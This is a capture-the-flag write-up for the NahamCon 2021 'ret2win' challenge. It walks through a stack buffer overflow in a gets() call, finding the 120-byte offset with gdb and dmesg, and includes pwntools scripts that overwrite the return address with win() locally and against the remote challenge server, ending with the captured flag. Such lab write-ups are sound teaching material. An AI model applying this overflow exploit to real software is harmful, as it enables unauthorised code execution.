# ret2win

## Disassembly

The main function:
```C
main(void) {
	vuln();
	puts("Nope :(");
	return 0;
}
```
So what is in the `vuln` function?
```C
void vuln(void)
{
	char input[112];

	printf("Can you overflow this?: ");
	gets(input);
	return;
}
```
This feels obvious, we have to overflow the string input, so we can clobber the instruction pointer and get our own assembly in.</br>
And what do we have to do? We have to return to the `win()` function, which in short reads from a `flag.txt` file. We can try and do this with `pwntools`!

## Proof of Concept

First I tried calling:
```bash
python3 -c "print('A'*112)" | ./ret2basic 
```
But this doesn't overflow, so we can try upping it up. I'm doing this to find the offset where we get a segmentation fault.
```bash
python3 -c "print('A'*120)" | ./ret2basic 
Can you overflow this?: free(): invalid pointer
Aborted

python3 -c "print('A'*135)" | ./ret2basic 
Can you overflow this?: Segmentation fault
```
So 120 gives us an invalid free and at 135 a segfault. Is this really the offset though?
```bash
python3 -c "print('A'*125)" | ./ret2basic 
Can you overflow this?: Segmentation fault
```
And checking `dmesg`:
```
Code: Unable to access opcode bytes at RIP 0x4141414117.
```
`0x41` is A. So this clearly clobbers the Instruction pointer! Now, can we get the RIP pointer to be 0?</br>
</br>
After some experimenting with `gdb` and `dmesg`, I got the following in gdb:
```
(gdb) 
Can you overflow this?: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()
(gdb) info registers
rax            0x7fffffffdfc0      140737488347072
rbx            0x0                 0
rcx            0x7ffff7fa9980      140737353783680
rdx            0x0                 0
rsi            0x7ffff7fa9a03      140737353783811
rdi            0x7ffff7fac4d0      140737353794768
rbp            0x4141414141414141  0x4141414141414141
rsp            0x7fffffffe040      0x7fffffffe040
r8             0x7fffffffdfc0      140737488347072
r9             0x0                 0
r10            0xfffffffffffff23f  -3521
r11            0x246               582
r12            0x401100            4198656
r13            0x7fffffffe120      140737488347424
r14            0x0                 0
r15            0x0                 0
rip            0x400041            0x400041     <----------
```
The Instruction pointer includes our `0x41`. This was 121 characters, so 120 characters is probably our sweet spot.

## Exploitation

Testing that our offset of 120 is correct:
```py
#!/usr/bin/env python3

from pwn import *

offset = 120

elf = ELF('./ret2basic')
p = elf.process()

print(p.recvuntil(": "))

payload = [
	b'A'*offset,
	b'BB'
] 

payload = b''.join(payload)

p.sendline(payload)
p.interactive()
```
So I ran it and got a segfault, next dmesg output!
```
[ 6605.507489] ret2basic[3356]: segfault at 4242 ip 0000000000004242 sp 00007ffec4e5da80 error 14 in ret2basic[400000+1000]
```
`segfault at 4242` is our two B's. Excellent! Now just to get the address of the flag function. Or `win()`.
```py
#!/usr/bin/env python3

from pwn import *

offset = 120

elf = ELF('./ret2basic')
p = elf.process()

print(p.recvuntil(": "))

payload = [
	b'A'*offset,
	p64(elf.symbols['win'])
] 

payload = b''.join(payload)

p.sendline(payload)
p.interactive()
```
Yes! This works locally, now just configure it to work on a remote connection:
```py
#!/usr/bin/env python3

from pwn import *

offset = 120

elf = ELF('./ret2basic')
p = remote('challenge.nahamcon.com',30413)

print(p.recvuntil(": "))

payload = [
	b'A'*offset,
	p64(elf.symbols['win'])
] 

payload = b''.join(payload)

p.sendline(payload)
p.interactive()
```
And what do we get?
```bash
./exploit.py 
[*] '/root/CTFs/Nahamcon-2021/ret2win/ret2basic'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.nahamcon.com on port 30413: Done
b'Can you overflow this?: '
[*] Switching to interactive mode
Here's your flag.
flag{d07f3219a8715e9339f31cfbe09d6502}
```
Awesome!
